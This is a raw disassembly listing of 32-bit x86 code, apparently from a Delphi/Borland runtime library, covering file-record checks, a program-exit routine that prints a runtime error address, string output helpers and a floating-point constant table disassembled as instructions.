  403c94:	74 f7                	je     0x403c8d
  403c96:	b8 67 00 00 00       	mov    $0x67,%eax
  403c9b:	e9 d4 e9 ff ff       	jmp    0x402674
  403ca0:	8b 50 04             	mov    0x4(%eax),%edx
  403ca3:	81 fa b2 d7 00 00    	cmp    $0xd7b2,%edx
  403ca9:	75 08                	jne    0x403cb3
  403cab:	ff 50 20             	call   *0x20(%eax)
  403cae:	85 c0                	test   %eax,%eax
  403cb0:	75 0e                	jne    0x403cc0
  403cb2:	c3                   	ret
  403cb3:	81 fa b1 d7 00 00    	cmp    $0xd7b1,%edx
  403cb9:	74 f7                	je     0x403cb2
  403cbb:	b8 67 00 00 00       	mov    $0x67,%eax
  403cc0:	e9 af e9 ff ff       	jmp    0x402674
  403cc5:	8d 40 00             	lea    0x0(%eax),%eax
  403cc8:	53                   	push   %ebx
  403cc9:	8b d8                	mov    %eax,%ebx
  403ccb:	8b 50 04             	mov    0x4(%eax),%edx
  403cce:	81 ea b1 d7 00 00    	sub    $0xd7b1,%edx
  403cd4:	74 0e                	je     0x403ce4
  403cd6:	83 fa 02             	cmp    $0x2,%edx
  403cd9:	77 19                	ja     0x403cf4
  403cdb:	ff 50 1c             	call   *0x1c(%eax)
  403cde:	85 c0                	test   %eax,%eax
  403ce0:	75 0b                	jne    0x403ced
  403ce2:	8b c3                	mov    %ebx,%eax
  403ce4:	ff 53 24             	call   *0x24(%ebx)
  403ce7:	85 c0                	test   %eax,%eax
  403ce9:	75 02                	jne    0x403ced
  403ceb:	5b                   	pop    %ebx
  403cec:	c3                   	ret
  403ced:	e8 82 e9 ff ff       	call   0x402674
  403cf2:	eb f7                	jmp    0x403ceb
  403cf4:	3d 38 b0 40 00       	cmp    $0x40b038,%eax
  403cf9:	74 f0                	je     0x403ceb
  403cfb:	b8 67 00 00 00       	mov    $0x67,%eax
  403d00:	eb eb                	jmp    0x403ced
  403d02:	8b c0                	mov    %eax,%eax
  403d04:	a3 20 b0 40 00       	mov    %eax,0x40b020
  403d09:	80 3d 30 b0 40 00 00 	cmpb   $0x0,0x40b030
  403d10:	74 17                	je     0x403d29
  403d12:	80 3d 14 b4 40 00 01 	cmpb   $0x1,0x40b414
  403d19:	0f 82 c0 00 00 00    	jb     0x403ddf
  403d1f:	74 08                	je     0x403d29
  403d21:	0b c0                	or     %eax,%eax
  403d23:	0f 84 c1 00 00 00    	je     0x403dea
  403d29:	a1 24 b0 40 00       	mov    0x40b024,%eax
  403d2e:	0b c0                	or     %eax,%eax
  403d30:	74 0c                	je     0x403d3e
  403d32:	33 d2                	xor    %edx,%edx
  403d34:	89 15 24 b0 40 00    	mov    %edx,0x40b024
  403d3a:	ff d0                	call   *%eax
  403d3c:	eb eb                	jmp    0x403d29
  403d3e:	83 3d 28 b0 40 00 00 	cmpl   $0x0,0x40b028
  403d45:	74 71                	je     0x403db8
  403d47:	a1 20 b0 40 00       	mov    0x40b020,%eax
  403d4c:	bb 24 a0 40 00       	mov    $0x40a024,%ebx
  403d51:	b9 0a 00 00 00       	mov    $0xa,%ecx
  403d56:	33 d2                	xor    %edx,%edx
  403d58:	f7 f1                	div    %ecx
  403d5a:	80 c2 30             	add    $0x30,%dl
  403d5d:	88 13                	mov    %dl,(%ebx)
  403d5f:	4b                   	dec    %ebx
  403d60:	85 c0                	test   %eax,%eax
  403d62:	75 f2                	jne    0x403d56
  403d64:	bb 30 a0 40 00       	mov    $0x40a030,%ebx
  403d69:	a1 28 b0 40 00       	mov    0x40b028,%eax
  403d6e:	2d 78 11 40 00       	sub    $0x401178,%eax
  403d73:	8b d0                	mov    %eax,%edx
  403d75:	83 e2 0f             	and    $0xf,%edx
  403d78:	8a 92 1c 3e 40 00    	mov    0x403e1c(%edx),%dl
  403d7e:	88 13                	mov    %dl,(%ebx)
  403d80:	4b                   	dec    %ebx
  403d81:	c1 e8 04             	shr    $0x4,%eax
  403d84:	75 ed                	jne    0x403d73
  403d86:	80 3d 31 b0 40 00 00 	cmpb   $0x0,0x40b031
  403d8d:	75 15                	jne    0x403da4
  403d8f:	6a 00                	push   $0x0
  403d91:	68 32 a0 40 00       	push   $0x40a032
  403d96:	68 14 a0 40 00       	push   $0x40a014
  403d9b:	6a 00                	push   $0x0
  403d9d:	e8 12 d4 ff ff       	call   0x4011b4
  403da2:	eb 14                	jmp    0x403db8
  403da4:	b8 04 b2 40 00       	mov    $0x40b204,%eax
  403da9:	ba 14 a0 40 00       	mov    $0x40a014,%edx
  403dae:	e8 31 02 00 00       	call   0x403fe4
  403db3:	e8 af 01 00 00       	call   0x403f67
  403db8:	b8 38 b0 40 00       	mov    $0x40b038,%eax
  403dbd:	e8 06 ff ff ff       	call   0x403cc8
  403dc2:	b8 04 b2 40 00       	mov    $0x40b204,%eax
  403dc7:	e8 fc fe ff ff       	call   0x403cc8
  403dcc:	e8 0b dc ff ff       	call   0x4019dc
  403dd1:	80 3d 14 b4 40 00 00 	cmpb   $0x0,0x40b414
  403dd8:	75 10                	jne    0x403dea
  403dda:	e8 d5 f2 ff ff       	call   0x4030b4
  403ddf:	ff 35 20 b0 40 00    	push   0x40b020
  403de5:	e8 a2 d3 ff ff       	call   0x40118c
  403dea:	e8 c5 f2 ff ff       	call   0x4030b4
  403def:	c6 05 14 b4 40 00 00 	movb   $0x0,0x40b414
  403df6:	a1 20 b0 40 00       	mov    0x40b020,%eax
  403dfb:	f7 d8                	neg    %eax
  403dfd:	1b c0                	sbb    %eax,%eax
  403dff:	40                   	inc    %eax
  403e00:	8b 3d 10 b4 40 00    	mov    0x40b410,%edi
  403e06:	8b 35 0c b4 40 00    	mov    0x40b40c,%esi
  403e0c:	8b 1d 08 b4 40 00    	mov    0x40b408,%ebx
  403e12:	8b 2d 04 b4 40 00    	mov    0x40b404,%ebp
  403e18:	c9                   	leave
  403e19:	c2 0c 00             	ret    $0xc
  403e1c:	30 31                	xor    %dh,(%ecx)
  403e1e:	32 33                	xor    (%ebx),%dh
  403e20:	34 35                	xor    $0x35,%al
  403e22:	36 37                	ss aaa
  403e24:	38 39                	cmp    %bh,(%ecx)
  403e26:	41                   	inc    %ecx
  403e27:	42                   	inc    %edx
  403e28:	43                   	inc    %ebx
  403e29:	44                   	inc    %esp
  403e2a:	45                   	inc    %ebp
  403e2b:	46                   	inc    %esi
  403e2c:	33 c0                	xor    %eax,%eax
  403e2e:	eb 00                	jmp    0x403e30
  403e30:	33 d2                	xor    %edx,%edx
  403e32:	89 15 28 b0 40 00    	mov    %edx,0x40b028
  403e38:	e9 c7 fe ff ff       	jmp    0x403d04
  403e3d:	33 c0                	xor    %eax,%eax
  403e3f:	eb 00                	jmp    0x403e41
  403e41:	8f 05 28 b0 40 00    	pop    0x40b028
  403e47:	e9 b8 fe ff ff       	jmp    0x403d04
  403e4c:	53                   	push   %ebx
  403e4d:	56                   	push   %esi
  403e4e:	8b f0                	mov    %eax,%esi
  403e50:	8b da                	mov    %edx,%ebx
  403e52:	8b 56 04             	mov    0x4(%esi),%edx
  403e55:	81 ea b0 d7 00 00    	sub    $0xd7b0,%edx
  403e5b:	74 0a                	je     0x403e67
  403e5d:	83 fa 03             	cmp    $0x3,%edx
  403e60:	77 19                	ja     0x403e7b
  403e62:	e8 61 fe ff ff       	call   0x403cc8
  403e67:	8b c6                	mov    %esi,%eax
  403e69:	89 5e 04             	mov    %ebx,0x4(%esi)
  403e6c:	ff 56 18             	call   *0x18(%esi)
  403e6f:	85 c0                	test   %eax,%eax
  403e71:	74 05                	je     0x403e78
  403e73:	e8 fc e7 ff ff       	call   0x402674
  403e78:	5e                   	pop    %esi
  403e79:	5b                   	pop    %ebx
  403e7a:	c3                   	ret
  403e7b:	b8 66 00 00 00       	mov    $0x66,%eax
  403e80:	e8 ef e7 ff ff       	call   0x402674
  403e85:	eb f1                	jmp    0x403e78
  403e87:	ba b1 d7 00 00       	mov    $0xd7b1,%edx
  403e8c:	eb be                	jmp    0x403e4c
  403e8e:	ba b2 d7 00 00       	mov    $0xd7b2,%edx
  403e93:	eb b7                	jmp    0x403e4c
  403e95:	ba b3 d7 00 00       	mov    $0xd7b3,%edx
  403e9a:	eb b0                	jmp    0x403e4c
  403e9c:	56                   	push   %esi
  403e9d:	57                   	push   %edi
  403e9e:	8b f2                	mov    %edx,%esi
  403ea0:	81 78 04 b2 d7 00 00 	cmpl   $0xd7b2,0x4(%eax)
  403ea7:	75 2e                	jne    0x403ed7
  403ea9:	8b 78 14             	mov    0x14(%eax),%edi
  403eac:	03 78 0c             	add    0xc(%eax),%edi
  403eaf:	8b 50 08             	mov    0x8(%eax),%edx
  403eb2:	2b 50 0c             	sub    0xc(%eax),%edx
  403eb5:	3b d1                	cmp    %ecx,%edx
  403eb7:	7f 16                	jg     0x403ecf
  403eb9:	01 50 0c             	add    %edx,0xc(%eax)
  403ebc:	2b ca                	sub    %edx,%ecx
  403ebe:	50                   	push   %eax
  403ebf:	51                   	push   %ecx
  403ec0:	8b ca                	mov    %edx,%ecx
  403ec2:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403ec4:	ff 50 1c             	call   *0x1c(%eax)
  403ec7:	85 c0                	test   %eax,%eax
  403ec9:	75 33                	jne    0x403efe
  403ecb:	59                   	pop    %ecx
  403ecc:	58                   	pop    %eax
  403ecd:	eb da                	jmp    0x403ea9
  403ecf:	01 48 0c             	add    %ecx,0xc(%eax)
  403ed2:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403ed4:	5f                   	pop    %edi
  403ed5:	5e                   	pop    %esi
  403ed6:	c3                   	ret
  403ed7:	3d 04 b2 40 00       	cmp    $0x40b204,%eax
  403edc:	75 14                	jne    0x403ef2
  403ede:	51                   	push   %ecx
  403edf:	52                   	push   %edx
  403ee0:	50                   	push   %eax
  403ee1:	e8 a8 ff ff ff       	call   0x403e8e
  403ee6:	58                   	pop    %eax
  403ee7:	5a                   	pop    %edx
  403ee8:	59                   	pop    %ecx
  403ee9:	81 78 04 b2 d7 00 00 	cmpl   $0xd7b2,0x4(%eax)
  403ef0:	74 b7                	je     0x403ea9
  403ef2:	b8 69 00 00 00       	mov    $0x69,%eax
  403ef7:	e8 78 e7 ff ff       	call   0x402674
  403efc:	eb d6                	jmp    0x403ed4
  403efe:	e8 71 e7 ff ff       	call   0x402674
  403f03:	59                   	pop    %ecx
  403f04:	58                   	pop    %eax
  403f05:	eb cd                	jmp    0x403ed4
  403f07:	8b ca                	mov    %edx,%ecx
  403f09:	ba 38 a0 40 00       	mov    $0x40a038,%edx
  403f0e:	83 f9 40             	cmp    $0x40,%ecx
  403f11:	7e 21                	jle    0x403f34
  403f13:	83 e9 40             	sub    $0x40,%ecx
  403f16:	50                   	push   %eax
  403f17:	51                   	push   %ecx
  403f18:	b9 40 00 00 00       	mov    $0x40,%ecx
  403f1d:	e8 7a ff ff ff       	call   0x403e9c
  403f22:	e8 2d f2 ff ff       	call   0x403154
  403f27:	83 b8 04 00 00 00 00 	cmpl   $0x0,0x4(%eax)
  403f2e:	75 0d                	jne    0x403f3d
  403f30:	59                   	pop    %ecx
  403f31:	58                   	pop    %eax
  403f32:	eb d5                	jmp    0x403f09
  403f34:	85 c9                	test   %ecx,%ecx
  403f36:	0f 8f 60 ff ff ff    	jg     0x403e9c
  403f3c:	c3                   	ret
  403f3d:	59                   	pop    %ecx
  403f3e:	58                   	pop    %eax
  403f3f:	c3                   	ret
  403f40:	33 c9                	xor    %ecx,%ecx
  403f42:	8a 0a                	mov    (%edx),%cl
  403f44:	42                   	inc    %edx
  403f45:	e9 52 ff ff ff       	jmp    0x403e9c
  403f4a:	53                   	push   %ebx
  403f4b:	33 db                	xor    %ebx,%ebx
  403f4d:	8a 1a                	mov    (%edx),%bl
  403f4f:	2b cb                	sub    %ebx,%ecx
  403f51:	7e 0b                	jle    0x403f5e
  403f53:	50                   	push   %eax
  403f54:	52                   	push   %edx
  403f55:	8b d1                	mov    %ecx,%edx
  403f57:	e8 ab ff ff ff       	call   0x403f07
  403f5c:	5a                   	pop    %edx
  403f5d:	58                   	pop    %eax
  403f5e:	8b cb                	mov    %ebx,%ecx
  403f60:	5b                   	pop    %ebx
  403f61:	42                   	inc    %edx
  403f62:	e9 35 ff ff ff       	jmp    0x403e9c
  403f67:	ba 78 a0 40 00       	mov    $0x40a078,%edx
  403f6c:	b9 02 00 00 00       	mov    $0x2,%ecx
  403f71:	e8 26 ff ff ff       	call   0x403e9c
  403f76:	e9 25 fd ff ff       	jmp    0x403ca0
  403f7b:	81 78 04 b2 d7 00 00 	cmpl   $0xd7b2,0x4(%eax)
  403f82:	75 1e                	jne    0x403fa2
  403f84:	8b 48 0c             	mov    0xc(%eax),%ecx
  403f87:	3b 48 08             	cmp    0x8(%eax),%ecx
  403f8a:	7d 09                	jge    0x403f95
  403f8c:	03 48 14             	add    0x14(%eax),%ecx
  403f8f:	88 11                	mov    %dl,(%ecx)
  403f91:	ff 40 0c             	incl   0xc(%eax)
  403f94:	c3                   	ret
  403f95:	50                   	push   %eax
  403f96:	52                   	push   %edx
  403f97:	ff 50 1c             	call   *0x1c(%eax)
  403f9a:	85 c0                	test   %eax,%eax
  403f9c:	75 27                	jne    0x403fc5
  403f9e:	5a                   	pop    %edx
  403f9f:	58                   	pop    %eax
  403fa0:	eb e2                	jmp    0x403f84
  403fa2:	3d 04 b2 40 00       	cmp    $0x40b204,%eax
  403fa7:	75 12                	jne    0x403fbb
  403fa9:	52                   	push   %edx
  403faa:	50                   	push   %eax
  403fab:	e8 de fe ff ff       	call   0x403e8e
  403fb0:	58                   	pop    %eax
  403fb1:	5a                   	pop    %edx
  403fb2:	81 78 04 b2 d7 00 00 	cmpl   $0xd7b2,0x4(%eax)
  403fb9:	74 c9                	je     0x403f84
  403fbb:	b8 69 00 00 00       	mov    $0x69,%eax
  403fc0:	e9 af e6 ff ff       	jmp    0x402674
  403fc5:	e8 aa e6 ff ff       	call   0x402674
  403fca:	5a                   	pop    %edx
  403fcb:	58                   	pop    %eax
  403fcc:	c3                   	ret
  403fcd:	52                   	push   %edx
  403fce:	8d 51 ff             	lea    -0x1(%ecx),%edx
  403fd1:	e8 31 ff ff ff       	call   0x403f07
  403fd6:	8b d4                	mov    %esp,%edx
  403fd8:	b9 01 00 00 00       	mov    $0x1,%ecx
  403fdd:	e8 ba fe ff ff       	call   0x403e9c
  403fe2:	5a                   	pop    %edx
  403fe3:	c3                   	ret
  403fe4:	33 c9                	xor    %ecx,%ecx
  403fe6:	eb 00                	jmp    0x403fe8
  403fe8:	56                   	push   %esi
  403fe9:	57                   	push   %edi
  403fea:	8b f0                	mov    %eax,%esi
  403fec:	51                   	push   %ecx
  403fed:	8b fa                	mov    %edx,%edi
  403fef:	83 c9 ff             	or     $0xffffffff,%ecx
  403ff2:	b0 00                	mov    $0x0,%al
  403ff4:	f2 ae                	repnz scas %es:(%edi),%al
  403ff6:	f7 d1                	not    %ecx
  403ff8:	49                   	dec    %ecx
  403ff9:	8b fa                	mov    %edx,%edi
  403ffb:	5a                   	pop    %edx
  403ffc:	2b d1                	sub    %ecx,%edx
  403ffe:	8b c6                	mov    %esi,%eax
  404000:	51                   	push   %ecx
  404001:	e8 01 ff ff ff       	call   0x403f07
  404006:	59                   	pop    %ecx
  404007:	8b c6                	mov    %esi,%eax
  404009:	8b d7                	mov    %edi,%edx
  40400b:	5f                   	pop    %edi
  40400c:	5e                   	pop    %esi
  40400d:	e9 8a fe ff ff       	jmp    0x403e9c
  404012:	8b c0                	mov    %eax,%eax
  404014:	85 c0                	test   %eax,%eax
  404016:	7c 48                	jl     0x404060
  404018:	74 45                	je     0x40405f
  40401a:	3d 00 14 00 00       	cmp    $0x1400,%eax
  40401f:	0f 8d 7f 00 00 00    	jge    0x4040a4
  404025:	8b d0                	mov    %eax,%edx
  404027:	83 e2 1f             	and    $0x1f,%edx
  40402a:	8d 14 92             	lea    (%edx,%edx,4),%edx
  40402d:	db 2c 55 b8 40 40 00 	fldt   0x4040b8(,%edx,2)
  404034:	de c9                	fmulp  %st,%st(1)
  404036:	c1 e8 05             	shr    $0x5,%eax
  404039:	74 24                	je     0x40405f
  40403b:	8b d0                	mov    %eax,%edx
  40403d:	83 e2 0f             	and    $0xf,%edx
  404040:	74 0c                	je     0x40404e
  404042:	8d 14 92             	lea    (%edx,%edx,4),%edx
  404045:	db 2c 55 ee 41 40 00 	fldt   0x4041ee(,%edx,2)
  40404c:	de c9                	fmulp  %st,%st(1)
  40404e:	c1 e8 04             	shr    $0x4,%eax
  404051:	74 0c                	je     0x40405f
  404053:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404056:	db 2c 45 84 42 40 00 	fldt   0x404284(,%eax,2)
  40405d:	de c9                	fmulp  %st,%st(1)
  40405f:	c3                   	ret
  404060:	f7 d8                	neg    %eax
  404062:	3d 00 14 00 00       	cmp    $0x1400,%eax
  404067:	7d 42                	jge    0x4040ab
  404069:	8b d0                	mov    %eax,%edx
  40406b:	83 e2 1f             	and    $0x1f,%edx
  40406e:	8d 14 92             	lea    (%edx,%edx,4),%edx
  404071:	db 2c 55 b8 40 40 00 	fldt   0x4040b8(,%edx,2)
  404078:	de f9                	fdivrp %st,%st(1)
  40407a:	c1 e8 05             	shr    $0x5,%eax
  40407d:	74 e0                	je     0x40405f
  40407f:	8b d0                	mov    %eax,%edx
  404081:	83 e2 0f             	and    $0xf,%edx
  404084:	74 0c                	je     0x404092
  404086:	8d 14 92             	lea    (%edx,%edx,4),%edx
  404089:	db 2c 55 ee 41 40 00 	fldt   0x4041ee(,%edx,2)
  404090:	de f9                	fdivrp %st,%st(1)
  404092:	c1 e8 04             	shr    $0x4,%eax
  404095:	74 c8                	je     0x40405f
  404097:	8d 04 80             	lea    (%eax,%eax,4),%eax
  40409a:	db 2c 45 84 42 40 00 	fldt   0x404284(,%eax,2)
  4040a1:	de f9                	fdivrp %st,%st(1)
  4040a3:	c3                   	ret
  4040a4:	db 2d ae 40 40 00    	fldt   0x4040ae
  4040aa:	c3                   	ret
  4040ab:	d9 ee                	fldz
  4040ad:	c3                   	ret
  4040ae:	00 00                	add    %al,(%eax)
  4040b0:	00 00                	add    %al,(%eax)
  4040b2:	00 00                	add    %al,(%eax)
  4040b4:	00 80 ff 7f 00 00    	add    %al,0x7fff(%eax)
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	00 00                	add    %al,(%eax)
  4040be:	00 80 ff 3f 00 00    	add    %al,0x3fff(%eax)
  4040c4:	00 00                	add    %al,(%eax)
  4040c6:	00 00                	add    %al,(%eax)
  4040c8:	00 a0 02 40 00 00    	add    %ah,0x4002(%eax)
  4040ce:	00 00                	add    %al,(%eax)
  4040d0:	00 00                	add    %al,(%eax)
  4040d2:	00 c8                	add    %cl,%al
  4040d4:	05 40 00 00 00       	add    $0x40,%eax
  4040d9:	00 00                	add    %al,(%eax)
  4040db:	00 00                	add    %al,(%eax)
  4040dd:	fa                   	cli
  4040de:	08 40 00             	or     %al,0x0(%eax)
  4040e1:	00 00                	add    %al,(%eax)
  4040e3:	00 00                	add    %al,(%eax)
  4040e5:	00 40 9c             	add    %al,-0x64(%eax)
  4040e8:	0c 40                	or     $0x40,%al
  4040ea:	00 00                	add    %al,(%eax)
  4040ec:	00 00                	add    %al,(%eax)
  4040ee:	00 00                	add    %al,(%eax)
  4040f0:	50                   	push   %eax
  4040f1:	c3                   	ret
  4040f2:	0f 40 00             	cmovo  (%eax),%eax
  4040f5:	00 00                	add    %al,(%eax)
  4040f7:	00 00                	add    %al,(%eax)
  4040f9:	00 24 f4             	add    %ah,(%esp,%esi,8)
  4040fc:	12 40 00             	adc    0x0(%eax),%al
  4040ff:	00 00                	add    %al,(%eax)
  404101:	00 00                	add    %al,(%eax)
  404103:	80 96 98 16 40 00 00 	adcb   $0x0,0x401698(%esi)
  40410a:	00 00                	add    %al,(%eax)
  40410c:	00 20                	add    %ah,(%eax)
  40410e:	bc be 19 40 00       	mov    $0x4019be,%esp
  404113:	00 00                	add    %al,(%eax)
  404115:	00 00                	add    %al,(%eax)
  404117:	28 6b ee             	sub    %ch,-0x12(%ebx)
  40411a:	1c 40                	sbb    $0x40,%al
  40411c:	00 00                	add    %al,(%eax)
  40411e:	00 00                	add    %al,(%eax)
  404120:	00 f9                	add    %bh,%cl
  404122:	02 95 20 40 00 00    	add    0x4020(%ebp),%dl
  404128:	00 00                	add    %al,(%eax)
  40412a:	40                   	inc    %eax
  40412b:	b7 43                	mov    $0x43,%bh
  40412d:	ba 23 40 00 00       	mov    $0x4023,%edx
  404132:	00 00                	add    %al,(%eax)
  404134:	10 a5 d4 e8 26 40    	adc    %ah,0x4026e8d4(%ebp)
  40413a:	00 00                	add    %al,(%eax)
  40413c:	00 00                	add    %al,(%eax)
  40413e:	2a e7                	sub    %bh,%ah
  404140:	84 91 2a 40 00 00    	test   %dl,0x402a(%ecx)
  404146:	00 80 f4 20 e6 b5    	add    %al,-0x4a19df0c(%eax)
  40414c:	2d 40 00 00 00       	sub    $0x40,%eax
  404151:	a0 31 a9 5f e3       	mov    0xe35fa931,%al
  404156:	30 40 00             	xor    %al,0x0(%eax)
  404159:	00 00                	add    %al,(%eax)
  40415b:	04 bf                	add    $0xbf,%al
  40415d:	c9                   	leave
  40415e:	1b 8e 34 40 00 00    	sbb    0x4034(%esi),%ecx
  404164:	00 c5                	add    %al,%ch
  404166:	2e bc a2 b1 37 40    	cs mov $0x4037b1a2,%esp
  40416c:	00 00                	add    %al,(%eax)
  40416e:	40                   	inc    %eax
  40416f:	76 3a                	jbe    0x4041ab
  404171:	6b 0b de             	imul   $0xffffffde,(%ebx),%ecx
  404174:	3a 40 00             	cmp    0x0(%eax),%al
  404177:	00 e8                	add    %ch,%al
  404179:	89 04 23             	mov    %eax,(%ebx,%eiz,1)
  40417c:	c7                   	(bad)
  40417d:	8a 3e                	mov    (%esi),%bh
  40417f:	40                   	inc    %eax
  404180:	00 00                	add    %al,(%eax)
  404182:	62 ac c5 eb 78 ad 41 	bound  %ebp,0x41ad78eb(%ebp,%eax,8)
  404189:	40                   	inc    %eax
  40418a:	00 80 7a 17 b7 26    	add    %al,0x26b7177a(%eax)
  404190:	d7                   	xlat   %ds:(%ebx)
  404191:	d8 44 40 00          	fadds  0x0(%eax,%eax,2)
  404195:	90                   	nop
  404196:	ac                   	lods   %ds:(%esi),%al
  404197:	6e                   	outsb  %ds:(%esi),(%dx)
  404198:	32 78 86             	xor    -0x7a(%eax),%bh
  40419b:	87 48 40             	xchg   %ecx,0x40(%eax)
  40419e:	00 b4 57 0a 3f 16 68 	add    %dh,0x68163f0a(%edi,%edx,2)
  4041a5:	a9 4b 40 00 a1       	test   $0xa100404b,%eax
  4041aa:	ed                   	in     (%dx),%eax
  4041ab:	cc                   	int3
  4041ac:	ce                   	into
  4041ad:	1b c2                	sbb    %edx,%eax
  4041af:	d3 4e 40             	rorl   %cl,0x40(%esi)
  4041b2:	a0 84 14 40 61       	mov    0x61401484,%al
  4041b7:	51                   	push   %ecx
  4041b8:	59                   	pop    %ecx
  4041b9:	84 52 40             	test   %dl,0x40(%edx)
  4041bc:	c8 a5 19 90          	enter  $0x19a5,$0x90
  4041c0:	b9 a5 6f a5 55       	mov    $0x55a56fa5,%ecx
  4041c5:	40                   	inc    %eax
  4041c6:	3a 0f                	cmp    (%edi),%cl
  4041c8:	20 f4                	and    %dh,%ah
  4041ca:	27                   	daa
  4041cb:	8f                   	(bad)
  4041cc:	cb                   	lret
  4041cd:	ce                   	into
  4041ce:	58                   	pop    %eax
  4041cf:	40                   	inc    %eax
  4041d0:	84 09                	test   %cl,(%ecx)
  4041d2:	94                   	xchg   %eax,%esp
  4041d3:	f8                   	clc
  4041d4:	78 39                	js     0x40420f
  4041d6:	3f                   	aas
  4041d7:	81 5c 40 e5 0b b9 36 	sbbl   $0xd736b90b,-0x1b(%eax,%eax,2)
  4041de:	d7 
  4041df:	07                   	pop    %es
  4041e0:	8f                   	(bad)
  4041e1:	a1 5f 40 df 4e       	mov    0x4edf405f,%eax
  4041e6:	67 04 cd             	addr16 add $0xcd,%al
  4041e9:	c9                   	leave
  4041ea:	f2 c9                	repnz leave
  4041ec:	62 40 96             	bound  %eax,-0x6a(%eax)
  4041ef:	22 81 45 40 7c 6f    	and    0x6f7c4045(%ecx),%al
  4041f5:	fc                   	cld
  4041f6:	65 40                	gs inc %eax
  4041f8:	9e                   	sahf
  4041f9:	b5 70                	mov    $0x70,%ch
  4041fb:	2b a8 ad c5 9d 69    	sub    0x699dc5ad(%eax),%ebp
  404201:	40                   	inc    %eax
  404202:	d5 a6                	aad    $0xa6
  404204:	cf                   	iret
  404205:	ff 49 1f             	decl   0x1f(%ecx)
  404208:	78 c2                	js     0x4041cc
  40420a:	d3 40 a3             	roll   %cl,-0x5d(%eax)
  40420d:	14 9b                	adc    $0x9b,%al
  40420f:	c5 16                	lds    (%esi),%edx
  404211:	ab                   	stos   %eax,%es:(%edi)
  404212:	b3 ef                	mov    $0xef,%bl
  404214:	3d 41 e0 8c e9       	cmp    $0xe98ce041,%eax
  404219:	80 c9 47             	or     $0x47,%cl
  40421c:	ba 93 a8 41 aa       	mov    $0xaa41a893,%edx
  404221:	17                   	pop    %ss
  404222:	e6 7f                	out    %al,$0x7f
  404224:	2b a1 16 b6 12 42    	sub    0x4212b616(%ecx),%esp
  40422a:	6b 55 27 39          	imul   $0x39,0x27(%ebp),%edx
  40422e:	8d                   	lea    (bad),%esi
  40422f:	f7 70 e0             	divl   -0x20(%eax)
  404232:	7c 42                	jl     0x404276
  404234:	30 c9                	xor    %cl,%cl
  404236:	3c e3                	cmp    $0xe3,%al
  404238:	ff 96 52 8a e7 42    	call   *0x42e78a52(%esi)
  40423e:	8e de                	mov    %esi,%ds
  404240:	f9                   	stc
  404241:	9d                   	popf
  404242:	fb                   	sti
  404243:	eb 7e                	jmp    0x4042c3
  404245:	aa                   	stos   %al,%es:(%edi)
  404246:	51                   	push   %ecx
  404247:	43                   	inc    %ebx
  404248:	8c 2f                	mov    %gs,(%edi)
  40424a:	6a 5c                	push   $0x5c
  40424c:	19 fc                	sbb    %edi,%esp
  40424e:	26 d2 bb 43 76 e3 cc 	sarb   %cl,%es:-0x331c89bd(%ebx)
  404255:	f2 29 2f             	repnz sub %ebp,(%edi)
  404258:	84 81 26 44 d2 0a    	test   %al,0xad24426(%ecx)
  40425e:	90                   	nop
  40425f:	db 00                	fildl  (%eax)
  404261:	27                   	daa
  404262:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404263:	9f                   	lahf
  404264:	90                   	nop
  404265:	44                   	inc    %esp
  404266:	17                   	pop    %ss
  404267:	aa                   	stos   %al,%es:(%edi)
  404268:	f8                   	clc
  404269:	ae                   	scas   %es:(%edi),%al
  40426a:	10 e3                	adc    %ah,%bl
  40426c:	c5 c4 fa             	(bad)
  40426f:	44                   	inc    %esp
  404270:	59                   	pop    %ecx
  404271:	9c                   	pushf
  404272:	b0 e9                	mov    $0xe9,%al
  404274:	07                   	pop    %es
  404275:	9c                   	pushf
  404276:	8a f2                	mov    %dl,%dh
  404278:	64 45                	fs inc %ebp
  40427a:	d4 f3                	aam    $0xf3
  40427c:	f7 eb                	imul   %ebx
  40427e:	e1 4a                	loope  0x4042ca
  404280:	7a 95                	jp     0x404217
  404282:	cf                   	iret
  404283:	45                   	inc    %ebp
  404284:	62 a2 95 07 dc d8    	bound  %esp,-0x2723f86b(%edx)
  40428a:	3e b8 39 46 c7 91    	ds mov $0x91c74639,%eax
  404290:	0e                   	push   %cs
  404291:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404292:	ae                   	scas   %es:(%edi),%al
  404293:	a0 19 e3 a3 46       	mov    0x46a3e319,%al
  404298:	17                   	pop    %ss
  404299:	0c 75                	or     $0x75,%al
  40429b:	81 86 75 76 c9 48 4d 	addl   $0x93a7e44d,0x48c97675(%esi)
  4042a2:	e4 a7 93 
  4042a5:	39 3b                	cmp    %edi,(%ebx)
  4042a7:	35 b8 b2 ed 53       	xor    $0x53edb2b8,%eax
  4042ac:	e5 5d                	in     $0x5d,%eax
  4042ae:	3d c5 5d 3b 8b       	cmp    $0x8b3b5dc5,%eax
  4042b3:	9e                   	sahf
  4042b4:	92                   	xchg   %eax,%edx
  4042b5:	5a                   	pop    %edx
  4042b6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4042b7:	f0 a1 20 c0 54 a5    	lock mov 0xa554c020,%eax
  4042bd:	8c 37                	mov    %?,(%edi)
  4042bf:	61                   	popa
  4042c0:	8b 5a 8b             	mov    -0x75(%edx),%ebx
  4042c3:	d8 25 5d 89 f9 db    	fsubs  0xdbf9895d
  4042c9:	67 f8                	addr16 clc
  4042cb:	f3 27                	repz daa
  4042cd:	bf a2 c8 5d dd       	mov    $0xdd5dc8a2,%edi
  4042d2:	80 6e 9b 97          	subb   $0x97,-0x65(%esi)
  4042d6:	20 8a 02 52 60 c4    	and    %cl,-0x3b9fadfe(%edx)
  4042dc:	25 75 f0 59 d5       	and    $0xd559f075,%eax
  4042e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4042e2:	62 11                	bound  %edx,(%ecx)
  4042e4:	35 ae ca 7b 55       	xor    $0x557bcaae,%eax
  4042e9:	8b ec                	mov    %esp,%ebp
  4042eb:	53                   	push   %ebx
  4042ec:	56                   	push   %esi
  4042ed:	57                   	push   %edi
  4042ee:	33 c0                	xor    %eax,%eax
  4042f0:	55                   	push   %ebp
  4042f1:	68 8a 43 40 00       	push   $0x40438a
  4042f6:	64 ff 30             	push   %fs:(%eax)
  4042f9:	64 89 20             	mov    %esp,%fs:(%eax)
  4042fc:	a1 d0 b3 40 00       	mov    0x40b3d0,%eax
  404301:	c1 e0 02             	shl    $0x2,%eax
